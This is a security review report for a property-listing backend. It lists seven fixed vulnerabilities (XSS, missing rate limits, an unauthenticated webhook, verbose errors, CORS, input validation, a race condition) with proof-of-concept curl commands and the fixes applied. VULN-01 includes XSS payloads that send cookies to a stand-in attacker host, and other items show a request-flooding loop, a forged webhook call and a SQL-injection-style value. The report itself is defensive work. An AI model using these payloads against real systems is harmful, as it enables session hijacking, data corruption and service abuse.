# Security Report

Security review of the Property Platform backend. Each item below documents a vulnerability that a naive first-pass implementation would have, and the concrete fix applied in this codebase — findings are presented as "if this control were removed" so the review is verifiable against the code as it exists today.

---

### VULN-01 — Stored XSS via unsanitized enquiry input

- **OWASP Category:** A03:2021 – Injection (Cross-Site Scripting)
- **Severity:** High
- **Affected File:** `src/controllers/enquiry.controller.ts` (input entry point), fixed in `src/middleware/security.ts:sanitizeBody`
- **Description:** The `message` and `fullName` fields are free text supplied by anonymous, unauthenticated users. Without sanitisation, a payload like `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` submitted as an enquiry message would be stored verbatim and execute in the browser of any staff member viewing it in an admin dashboard or CRM UI.
- **Business Impact:** Session hijacking of staff/admin accounts, credential theft, defacement of internal tooling, potential lateral movement into the CRM.
- **Proof of Concept:**
  ```bash
  curl -X POST https://api.yourdomain.com/api/enquiry -H "Content-Type: application/json" -d '{
    "fullName":"<img src=x onerror=alert(document.cookie)>",
    "email":"attacker@example.com","propertyId":1,
    "message":"<script>fetch(\"https://evil.com/steal?c=\"+document.cookie)</script>"
  }'
  ```
- **Recommended Fix (implemented):** `sanitizeBody` middleware runs on every request before validation, recursively stripping all HTML/script tags from every string field using `sanitize-html` with an empty allow-list. Applied at the input boundary rather than relying only on output-encoding, since the same enquiry data flows to multiple downstream consumers (CRM, email templates, admin UI) that may not all escape consistently.

---

### VULN-02 — No rate limiting enabling brute-force / flooding

- **OWASP Category:** A04:2021 – Insecure Design / API4:2023 (API Security Top 10) – Unrestricted Resource Consumption
- **Severity:** High
- **Affected File:** `src/middleware/rateLimiter.ts`
- **Description:** Without limits, `POST /api/enquiry` can be called an unbounded number of times per second by a script, filling the database with junk and consuming CRM-sync/email-queue capacity meant for real leads.
- **Business Impact:** Database bloat, wasted third-party API quota (CRM/SMTP), degraded performance for real users, inflated (fake) lead counts reaching sales teams.
- **Proof of Concept:**
  ```bash
  for i in $(seq 1 500); do curl -s -X POST https://api.yourdomain.com/api/enquiry \
    -H "Content-Type: application/json" \
    -d "{\"fullName\":\"Bot $i\",\"email\":\"bot$i@x.com\",\"propertyId\":1,\"message\":\"test $i\"}" & done
  ```
- **Recommended Fix (implemented):** Redis-backed rate limiting (`express-rate-limit` + `rate-limit-redis`) applied at two layers: a general `/api` limit (100 req/min/IP) and a much stricter enquiry-specific limit (5 req/min/IP). Redis backing (rather than in-memory) ensures limits hold across PM2 cluster instances / multiple containers and survive process restarts. A second layer at the Nginx edge (`nginx/nginx.conf`, `limit_req_zone`) rejects abusive traffic before it even reaches Node.

---

### VULN-03 — Unauthenticated CRM webhook endpoint

- **OWASP Category:** A07:2021 – Identification and Authentication Failures / API2:2023 – Broken Authentication
- **Severity:** Critical
- **Affected File:** `src/controllers/webhook.controller.ts`, `src/services/crm.service.ts`
- **Description:** `POST /api/webhook/crm` is internet-facing by necessity (the external CRM must be able to reach it). Without verifying the caller is actually the CRM, anyone who discovers the URL can POST arbitrary status updates for any enquiry ID, or use it as a foothold for further injection attempts.
- **Business Impact:** Data integrity loss (enquiries marked "converted" that never were), potential to trigger unwanted downstream automation, reputational/financial harm if fake "converted" leads drive business decisions.
- **Proof of Concept:**
  ```bash
  curl -X POST https://api.yourdomain.com/api/webhook/crm -H "Content-Type: application/json" -d '{
    "event":"lead.status_changed","enquiryId":1,"crmRecordId":"fake_123","status":"converted"
  }'
  # Without signature verification, this succeeds and silently corrupts real data.
  ```
- **Recommended Fix (implemented):** Every webhook request must include an `X-CRM-Signature: sha256=<hmac>` header, computed by the CRM over the raw request body using a shared secret (`CRM_WEBHOOK_SECRET`). `verifyWebhookSignature` recomputes the HMAC server-side and compares using `crypto.timingSafeEqual` (constant-time, avoids timing-attack signature guessing). Requests with an invalid/missing signature are logged as `rejected` and return `401` without touching enquiry data.

---

### VULN-04 — Sensitive data exposure via verbose error responses

- **OWASP Category:** A05:2021 – Security Misconfiguration
- **Severity:** Medium
- **Affected File:** `src/middleware/errorHandler.ts`
- **Description:** A naive `catch (err) { res.status(500).json({ error: err.message, stack: err.stack }) }` leaks internal details: file paths, SQL fragments (revealing table/column names), library versions, and stack traces — all reconnaissance an attacker can use to plan further attacks.
- **Business Impact:** Accelerates an attacker's ability to craft a targeted SQL injection or identify a vulnerable dependency version; low direct impact alone but a strong enabler for other attacks.
- **Proof of Concept:** Send a malformed `propertyId` (e.g. a huge string) to `GET /api/enquiry/:id` on a version of the code without this fix, and observe a raw MySQL driver error message reflected in the response body, including table names.
- **Recommended Fix (implemented):** Centralised `errorHandler` distinguishes `AppError` (operational, author-controlled message — safe to show) from unexpected errors (logged in full server-side via Winston, but the client only ever receives a generic `"Something went wrong"` message plus a `requestId` for support correlation). Stack traces never leave the server process.

---

### VULN-05 — Overly permissive CORS

- **OWASP Category:** A05:2021 – Security Misconfiguration
- **Severity:** Medium
- **Affected File:** `src/middleware/security.ts:corsOriginValidator`
- **Description:** `cors()` with no options defaults to `Access-Control-Allow-Origin: *`, meaning any website can make authenticated cross-origin requests against the API from a victim's browser.
- **Business Impact:** Enables cross-site request forgery-style abuse and unauthorized data scraping of API responses from arbitrary third-party sites.
- **Recommended Fix (implemented):** `corsOriginValidator` checks the request `Origin` header against an explicit allow-list read from `CORS_ALLOWED_ORIGINS` env var; anything not on the list is rejected by the CORS layer itself.

---

### VULN-06 — Weak input validation enabling injection & malformed-data crashes

- **OWASP Category:** A03:2021 – Injection
- **Severity:** High
- **Affected File:** `src/validators/enquiry.validator.ts`
- **Description:** Without strict schema validation, fields like `propertyId` could be sent as non-numeric strings, `email` could omit the `@`, or a `message` field of unbounded length could be submitted, all reaching the database layer.
- **Business Impact:** Application crashes on malformed input (denial of service), potential injection if any query path were ever built via string concatenation instead of parameterisation, database bloat from oversized fields.
- **Proof of Concept:**
  ```bash
  curl -X POST .../api/enquiry -d '{"propertyId":"1 OR 1=1","email":"not-an-email","message":""}'
  ```
- **Recommended Fix (implemented):** Every request body/query/param is validated against a strict Zod schema (`createEnquirySchema`, `listEnquiriesQuerySchema`, etc.) before reaching a controller — type-coerced, length-bounded, and format-checked. Combined with parameterised queries (`mysql2` named placeholders, never string concatenation — see `enquiry.service.ts`), this is defense-in-depth: validation blocks malformed input at the door, and parameterisation means even a hypothetical validation bypass could not alter SQL structure.

---

### VULN-07 — No duplicate-submission protection (race condition)

- **OWASP Category:** A04:2021 – Insecure Design
- **Severity:** Medium
- **Affected File:** `src/services/enquiry.service.ts`, `migrations/001_init.sql`
- **Description:** A "check if it exists, then insert" pattern implemented purely in application code is subject to a classic TOCTOU (time-of-check-to-time-of-use) race: two near-simultaneous identical requests can both pass the "not found" check before either has inserted, resulting in duplicate rows.
- **Business Impact:** Duplicate leads reaching the CRM and sales team, double emails sent to the same customer, inflated/inaccurate reporting.
- **Recommended Fix (implemented):** A `UNIQUE` index on `enquiries.fingerprint` (a SHA-256 hash of normalized email + phone + property + message) makes MySQL itself the final arbiter — the second of two concurrent identical inserts fails atomically with error 1062, which the service layer catches and returns as a clean `409 Conflict`. This is race-condition-proof regardless of how many app instances are running concurrently. A separate, complementary `Idempotency-Key` header mechanism (`src/middleware/idempotency.ts`) additionally protects against exact-retry scenarios (double-clicks, network retries) even before the fingerprint check runs.

---

## Summary Table

| ID | Vulnerability | OWASP | Severity | Status |
|---|---|---|---|---|
| VULN-01 | Stored XSS via unsanitized input | A03:2021 | High | Fixed |
| VULN-02 | Missing rate limiting | A04:2021 / API4 | High | Fixed |
| VULN-03 | Unauthenticated webhook | A07:2021 / API2 | Critical | Fixed |
| VULN-04 | Verbose error responses | A05:2021 | Medium | Fixed |
| VULN-05 | Permissive CORS | A05:2021 | Medium | Fixed |
| VULN-06 | Weak input validation | A03:2021 | High | Fixed |
| VULN-07 | Duplicate-submission race condition | A04:2021 | Medium | Fixed |

See [THREAT_SCENARIOS.md](./THREAT_SCENARIOS.md) for these same issues walked through as attacker-perspective scenarios, as required by the assessment brief.
